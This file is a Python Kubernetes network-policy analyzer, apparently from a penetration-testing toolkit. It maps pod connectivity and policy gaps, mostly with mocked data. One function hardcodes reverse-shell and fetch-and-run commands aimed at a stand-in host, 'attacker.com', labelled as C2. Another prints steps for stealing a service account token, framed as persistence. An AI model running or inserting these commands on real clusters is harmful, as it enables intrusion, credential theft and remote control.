"""Analyze network policies and identify lateral movement opportunities."""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class CNIPlugin(str, Enum):
    """Container Network Interface plugins."""

    FLANNEL = "flannel"
    CALICO = "calico"
    CILIUM = "cilium"
    WEAVE = "weave"
    CANAL = "canal"
    KUBE_ROUTER = "kube-router"
    UNKNOWN = "unknown"


class PolicyGapType(str, Enum):
    """Types of network policy gaps."""

    NO_INGRESS_POLICY = "no_ingress_policy"
    NO_EGRESS_POLICY = "no_egress_policy"
    ALLOWS_ALL_INGRESS = "allows_all_ingress"
    ALLOWS_ALL_EGRESS = "allows_all_egress"
    DEFAULT_ALLOW = "default_allow"


@dataclass
class PolicyGap:
    """Network policy gap in the cluster."""

    pod_name: str
    namespace: str
    gap_type: PolicyGapType
    exploitability: str  # HIGH, MEDIUM, LOW
    pivot_targets: list[str] = field(default_factory=list)
    description: str = ""

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "pod_name": self.pod_name,
            "namespace": self.namespace,
            "gap_type": self.gap_type.value,
            "exploitability": self.exploitability,
            "pivot_targets": self.pivot_targets,
            "description": self.description,
        }


@dataclass
class NetworkPath:
    """Path between two pods in the network."""

    source_pod: str
    source_namespace: str
    dest_pod: str
    dest_namespace: str
    dest_port: int | None = None
    protocol: str = "TCP"
    reachability: str = "ALLOWED"  # ALLOWED, BLOCKED, UNKNOWN
    lateral_movement_commands: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "source_pod": self.source_pod,
            "source_namespace": self.source_namespace,
            "dest_pod": self.dest_pod,
            "dest_namespace": self.dest_namespace,
            "dest_port": self.dest_port,
            "protocol": self.protocol,
            "reachability": self.reachability,
            "lateral_movement_commands": self.lateral_movement_commands,
        }


@dataclass
class ConnectivityMatrix:
    """Pod-to-pod connectivity matrix for a namespace."""

    namespace: str
    pods: list[str] = field(default_factory=list)
    connectivity: dict[tuple[str, str], bool] = field(default_factory=dict)
    gaps: list[PolicyGap] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "namespace": self.namespace,
            "pods": self.pods,
            "connectivity": {f"{src}-{dst}": reachable for (src, dst), reachable in self.connectivity.items()},
            "gaps": [gap.to_dict() for gap in self.gaps],
        }


class NetworkPolicyAnalyzer:
    """Analyze network policies and connectivity."""

    def __init__(self):
        """Initialize analyzer."""
        self.cni_plugin = CNIPlugin.UNKNOWN
        self.policies = {}
        self.pods = {}

    def detect_cni_plugin(self) -> CNIPlugin:
        """Detect installed CNI plugin.

        Returns:
            Detected CNIPlugin enum
        """
        # In real implementation, would check:
        # - kubectl get daemonset -n kube-system | grep network
        # - NetworkPolicy support level

        # Mocked detection
        self.cni_plugin = CNIPlugin.CALICO
        return self.cni_plugin

    def build_connectivity_matrix(self, namespace: str) -> ConnectivityMatrix:
        """Build pod-to-pod reachability matrix for a namespace.

        Args:
            namespace: Kubernetes namespace to analyze

        Returns:
            ConnectivityMatrix with pod connections
        """
        matrix = ConnectivityMatrix(namespace=namespace)

        # In real implementation, would:
        # 1. Get all pods in namespace
        # 2. Evaluate NetworkPolicy rules against each pod pair
        # 3. Check default policies (deny-all, allow-all)

        # Mocked example for "production" namespace
        if namespace == "production":
            matrix.pods = ["app-1", "app-2", "db-1"]
            # Simulate connectivity matrix
            matrix.connectivity = {
                ("app-1", "app-2"): True,
                ("app-1", "db-1"): False,
                ("app-2", "app-1"): True,
                ("app-2", "db-1"): True,
                ("db-1", "app-1"): False,
                ("db-1", "app-2"): False,
            }
            # Add gap for allow-all on app-2
            matrix.gaps.append(
                PolicyGap(
                    pod_name="app-2",
                    namespace=namespace,
                    gap_type=PolicyGapType.ALLOWS_ALL_EGRESS,
                    exploitability="HIGH",
                    pivot_targets=["api-server.default", "external-service"],
                    description="Pod can reach external services",
                )
            )
        else:
            # Default namespace with fewer restrictions
            matrix.pods = ["default-pod-1", "default-pod-2"]
            matrix.connectivity = {
                ("default-pod-1", "default-pod-2"): True,
                ("default-pod-2", "default-pod-1"): True,
            }
            matrix.gaps.append(
                PolicyGap(
                    pod_name="default-pod-1",
                    namespace=namespace,
                    gap_type=PolicyGapType.DEFAULT_ALLOW,
                    exploitability="HIGH",
                    description="No network policies enforced",
                )
            )

        return matrix

    def find_policy_gaps(self) -> list[PolicyGap]:
        """Find network policy gaps across cluster.

        Returns:
            List of identified PolicyGap instances
        """
        gaps = []

        # Analyze production namespace
        prod_matrix = self.build_connectivity_matrix("production")
        gaps.extend(prod_matrix.gaps)

        # Analyze default namespace
        default_matrix = self.build_connectivity_matrix("default")
        gaps.extend(default_matrix.gaps)

        # Additional checks
        gaps.append(
            PolicyGap(
                pod_name="logging-pod",
                namespace="logging",
                gap_type=PolicyGapType.ALLOWS_ALL_EGRESS,
                exploitability="HIGH",
                pivot_targets=["internet"],
                description="Logging pod has unrestricted egress",
            )
        )

        return gaps

    def find_unrestricted_egress(self) -> list[tuple[str, str]]:
        """Find pods with unrestricted egress to internet.

        Returns:
            List of (pod_name, namespace) tuples with unrestricted egress
        """
        unrestricted = []

        gaps = self.find_policy_gaps()
        for gap in gaps:
            if gap.gap_type == PolicyGapType.ALLOWS_ALL_EGRESS:
                unrestricted.append((gap.pod_name, gap.namespace))

        return unrestricted

    def find_lateral_movement_paths(self) -> list[NetworkPath]:
        """Find lateral movement paths between pods.

        Returns:
            List of NetworkPath instances with movement commands
        """
        paths = []

        # Path 1: app-1 → app-2 (allowed)
        paths.append(
            NetworkPath(
                source_pod="app-1",
                source_namespace="production",
                dest_pod="app-2",
                dest_namespace="production",
                dest_port=8080,
                reachability="ALLOWED",
                lateral_movement_commands=[
                    "kubectl exec -it app-1 -n production -- sh -c 'nc -zv app-2.production.svc.cluster.local 8080'",
                    "kubectl exec -it app-1 -n production -- sh -c 'curl http://app-2.production.svc.cluster.local:8080'",
                ],
            )
        )

        # Path 2: app-2 → db-1 (allowed via egress gap)
        paths.append(
            NetworkPath(
                source_pod="app-2",
                source_namespace="production",
                dest_pod="db-1",
                dest_namespace="production",
                dest_port=5432,
                reachability="ALLOWED",
                lateral_movement_commands=[
                    "kubectl exec -it app-2 -n production -- sh -c 'psql -h db-1.production.svc.cluster.local -U postgres'",
                    "kubectl exec -it app-2 -n production -- sh -c 'socat TCP-LISTEN:5432,fork TCP:db-1:5432'",
                ],
            )
        )

        # Path 3: Any pod → internet (via unrestricted egress)
        paths.append(
            NetworkPath(
                source_pod="logging-pod",
                source_namespace="logging",
                dest_pod="external-c2",
                dest_namespace="external",
                dest_port=443,
                protocol="TCP",
                reachability="ALLOWED",
                lateral_movement_commands=[
                    "kubectl exec -it logging-pod -n logging -- bash -i >& /dev/tcp/attacker.com/443 0>&1",
                    "kubectl exec -it logging-pod -n logging -- nc -e /bin/bash attacker.com 443",
                    "kubectl exec -it logging-pod -n logging -- curl http://attacker.com/shell | bash",
                ],
            )
        )

        return paths

    def generate_pivot_commands(self, path: NetworkPath) -> str:
        """Generate commands to pivot via a network path.

        Args:
            path: NetworkPath to generate commands for

        Returns:
            Multi-line string with pivot commands
        """
        commands = []

        commands.append(f"# Pivot from {path.source_pod} to {path.dest_pod}")
        commands.append(f"# Target: {path.dest_pod}.{path.dest_namespace}.svc.cluster.local:{path.dest_port}")
        commands.append("")

        # Basic connectivity check
        commands.append(f"kubectl exec -it {path.source_pod} -n {path.source_namespace} -- \\")
        commands.append(f"  nc -zv {path.dest_pod}.{path.dest_namespace}.svc.cluster.local {path.dest_port}")
        commands.append("")

        # Service account token pivot
        commands.append("# Extract target pod's service account token (if accessible)")
        commands.append(
            f"kubectl exec -it {path.dest_pod} -n {path.dest_namespace} -- \\",
        )
        commands.append(
            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        )
        commands.append("")

        # Tunnel commands if needed
        if len(path.lateral_movement_commands) > 0:
            commands.append("# Use these commands to establish persistence:")
            for cmd in path.lateral_movement_commands[:2]:
                commands.append(f"# {cmd}")

        return "\n".join(commands)

    def to_report(self) -> str:
        """Generate network analysis report.

        Returns:
            Formatted network analysis summary
        """
        lines = []

        lines.append("# Network Policy Analysis Report")
        lines.append("")

        # CNI plugin
        cni = self.detect_cni_plugin()
        lines.append(f"## CNI Plugin: {cni.value}")
        lines.append("")

        # Policy gaps
        gaps = self.find_policy_gaps()
        lines.append(f"## Policy Gaps ({len(gaps)} found)")
        for gap in gaps:
            lines.append(f"- **{gap.pod_name}** ({gap.namespace}): {gap.gap_type.value}")
            lines.append(f"  - Exploitability: {gap.exploitability}")
            lines.append(f"  - Targets: {', '.join(gap.pivot_targets)}")
            lines.append("")

        # Lateral movement paths
        paths = self.find_lateral_movement_paths()
        lines.append(f"## Lateral Movement Paths ({len(paths)} found)")
        for path in paths:
            lines.append(f"- {path.source_pod} ({path.source_namespace}) → {path.dest_pod} ({path.dest_namespace})")
            lines.append(f"  - Status: {path.reachability}")
            lines.append(f"  - Port: {path.dest_port}")
            lines.append("")

        return "\n".join(lines)
